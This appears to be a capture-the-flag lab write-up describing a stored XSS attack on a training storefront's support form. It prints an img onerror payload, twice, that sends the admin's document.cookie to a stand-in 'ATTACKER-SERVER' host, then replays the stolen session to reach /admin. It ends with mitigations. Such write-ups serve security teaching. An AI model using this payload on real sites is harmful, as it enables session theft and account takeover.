---
title: "Stored Cross-Site Scripting (XSS) Leads to Administrative Session Hijacking | PortWart"
date: 2026-06-10 14:00:00 +0530
categories: [A05 - Injection, Cross-Site Scripting (XSS)]
tags: [xss, stored-xss, session-hijacking, cookie-theft, admin-takeover, webverselabs-pro]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/portwart-stored-xss.webp
  alt: "PortWart Stored XSS Challenge"
---

## Lab Link

Lab: [PortWart](https://dashboard.webverselabs-pro.com/mystery-challenges/portwart)

---

## Overview

PortWart is a small build-to-order storefront where customer inquiries, support tickets, warranty requests, and inventory questions are handled through a shared support queue. During testing, it was discovered that support ticket content was rendered directly inside an administrative interface without proper sanitization.

This behavior enabled a **Stored Cross-Site Scripting (XSS)** vulnerability that allowed arbitrary JavaScript execution in an administrator's browser. By leveraging the vulnerability, an administrative session cookie was stolen and reused to gain access to the hidden administrative dashboard.

The challenge ultimately demonstrated how Stored XSS can escalate into complete administrative compromise when session management controls are insufficient.

---

## Objective

Gain administrative access to the application and retrieve the challenge flag.

---

## Vulnerability Identification

### Classification Hierarchy

```text
A05 - Injection
└── Cross-Site Scripting (XSS)
    └── Stored XSS
        └── Session Hijacking
            └── Administrative Account Compromise
```

### Vulnerability Type

| Category          | Value                       |
| ----------------- | --------------------------- |
| OWASP Top 10:2025 | A05 - Injection             |
| CWE               | CWE-79                      |
| Vulnerability     | Stored Cross-Site Scripting |
| Impact            | Session Hijacking           |
| Severity          | High                        |

---

## Reconnaissance

Application functionality was reviewed to identify areas where user-supplied content was later displayed to privileged users.

The support/help section appeared to allow arbitrary input that would subsequently be viewed by administrative staff.

While enumerating the application, the `robots.txt` file revealed a hidden administrative endpoint.

### robots.txt Discovery

```http
GET /robots.txt HTTP/1.1
Host: target
```

Response:

```text
Disallow: /admin
```

This disclosed the location of the administrative interface but did not provide a method to access it.

At this stage, the objective became obtaining an authenticated administrative session.

---

## Vulnerability Discovery

To determine whether support messages were vulnerable to Stored XSS, a payload was submitted through the support form.

### XSS Test Payload

```html
<img src=x onerror="new Image().src='http://ATTACKER-SERVER/?cookie='+document.cookie">
```

The payload was designed to execute when viewed by an administrator.

### Why It Works

1. Browser attempts to load an invalid image.
2. Image loading fails.
3. The `onerror` event fires.
4. JavaScript executes within the administrator's session.
5. The administrator's cookies are transmitted to an attacker-controlled endpoint.

---

## Exploitation

### Deploying the Payload

The payload was submitted directly through the support/help section.

```html
<img src=x onerror="new Image().src='http://ATTACKER-SERVER/?cookie='+document.cookie">
```

Because support messages were rendered without proper sanitization, the payload was stored by the application.

---

### Capturing the Administrator Session

After an administrator reviewed the support ticket, the payload executed automatically.

The attacker-controlled listener received the administrator's session cookie.

Example response:

```text
cookie=admin_session=7ea858779b78e56f2a80a6ec96764f53
```

This confirmed successful JavaScript execution within the administrator's browser context.

---

### Session Hijacking

The captured session value was added to the browser using Developer Tools.

```text
admin_session=7ea858779b78e56f2a80a6ec96764f53 
```

After replacing the existing cookie with the administrative session, requests to the hidden administrative endpoint were automatically authenticated.

```http
GET /admin HTTP/1.1
Cookie: admin_session=7ea858779b78e56f2a80a6ec96764f53
```

The application granted access to the administrative dashboard.

---

## Proof of Exploitation

### Attack Flow

```text
User Input
    ↓
Support Ticket Stored
    ↓
Administrator Opens Ticket
    ↓
Stored XSS Executes
    ↓
Cookie Exfiltration
    ↓
Session Hijacking
    ↓
Administrative Dashboard Access
    ↓
Challenge Flag Retrieved
```

### Successful Outcomes

* Stored XSS execution achieved
* Administrative cookie theft
* Administrative session hijacking
* Authentication bypass
* Administrative dashboard access
* Challenge completion

---

## Root Cause Analysis

The compromise resulted from multiple independent security weaknesses.

### 1. Unsanitized User Input

Support ticket content was rendered directly into administrative pages without sanitization.

### 2. Missing Output Encoding

User-controlled HTML was inserted into page content without context-aware output encoding.

### 3. JavaScript-Accessible Session Cookies

The administrative session cookie could be accessed through:

```javascript
document.cookie
```

This allowed direct theft of authentication tokens.

### 4. Administrative Endpoint Disclosure

Sensitive application routes were disclosed through:

```text
robots.txt
```

While not directly exploitable, this reduced attacker effort during enumeration.

---

## Impact

An attacker exploiting this vulnerability could potentially:

* Execute arbitrary JavaScript in administrator browsers
* Steal authenticated session cookies
* Perform privileged administrative actions
* Access internal management interfaces
* Modify application data
* Create additional privileged accounts
* Achieve complete administrative compromise

In real-world environments, Stored XSS vulnerabilities routinely lead to full account takeover when session protection mechanisms are weak.

---

## Mitigation

### Input Validation

Reject or sanitize dangerous HTML and JavaScript content before storage.

### Context-Aware Output Encoding

Encode all user-controlled content before rendering it inside HTML pages.

### Content Security Policy (CSP)

Deploy a restrictive Content Security Policy to reduce XSS impact.

Example:

```http
Content-Security-Policy:
default-src 'self';
script-src 'self';
object-src 'none';
```

### HttpOnly Cookies

Sensitive session cookies should be configured as:

```http
Set-Cookie:
session=VALUE;
HttpOnly;
Secure;
SameSite=Lax
```

This prevents JavaScript from reading session tokens.

### Administrative Route Protection

Administrative paths should never be treated as secret resources and should not be disclosed through mechanisms such as:

```text
robots.txt
```

Access controls must be enforced independently of route discovery.

---

## Real-World Insight

Stored XSS remains one of the most dangerous web vulnerabilities because exploitation often requires only a single privileged user to view attacker-controlled content.

Once JavaScript executes within an administrator's browser, attackers can frequently:

* Steal session tokens
* Perform privileged actions
* Modify application settings
* Create new administrative users
* Fully compromise backend systems

PortWart demonstrates a classic attack chain where multiple individually moderate weaknesses Stored XSS, accessible session cookies, and administrative endpoint disclosure combine to produce a complete administrative takeover.

The challenge serves as an excellent example of why input sanitization, output encoding, Content Security Policy, and HttpOnly session cookies must be implemented together rather than relied upon individually.
